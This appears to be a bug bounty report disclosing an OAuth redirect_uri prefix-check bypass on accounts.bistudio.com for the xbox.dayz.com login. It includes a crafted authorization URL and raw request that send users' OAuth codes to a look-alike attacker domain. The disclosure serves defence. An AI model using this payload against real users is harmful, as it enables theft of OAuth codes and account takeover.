Summary:

Hi,
I would like to report an Open redirection on oauth redirect_uri which can lead to users oauth tokens being leaked to any malicious user.

**Detail**

During the OAUTH flow, the redirect_uri on https://accounts.bistudio.com is not properly validating that the URL given is proper, as such a bypass of filter is possible and hence thereby able to exfiltrate users oauth tokens to that nonexisting domain.

On clicking on Login on https://xbox.dayz.com an OAUTH request is triggered to accounts.bistudio.com, the endpoint is checking if the Redirect_uri is starting with https://xbox.dayz.com and not checking the ending bits, as such its possible to inject anything after that. 

As an example i injected https://xbox.dayz.comtest.com and the server's whitelist is bypasses and a redirect is performed to https://xbox.dayz.comtest.com with the code and state values.

**Steps to Reproduce**

* Login to any website in the scope 
* After Login access the following URL - 

```
https://accounts.bistudio.com/api/auth?response_type=code&redirect_uri=http%3A%2F%2Fxbox.dayz.comtest.com%2Fapi%2Fauth%2Fcallback&state=OCoU2LvhmzLGAZ03DWem5QNs&client_id=%24edd1bfdc470df4b8d7b81c2683fc6d3
```
* On accessing you will get redirected to **xbox.dayz.comtest.com** with oauth access code and state, registering such domain is possible and when any loggedin user accesses the URL its possible to steal their oauth creds.


**RAW Request**
```
GET /api/auth?response_type=code&redirect_uri=http%3A%2F%2Fxbox.dayz.comtest.com%2Fapi%2Fauth%2Fcallback&state=OCoU2LvhmzLGAZ03DWem5QNs&client_id=%24edd1bfdc470df4b8d7b81c2683fc6d3 HTTP/1.1

```

## Impact

Due to validation bypass in redirect_uri parameter in OAUTH flow, its possible to redirect authenticated users to arbitrary domains with their oauth credentials from which its possible to takeover their account.
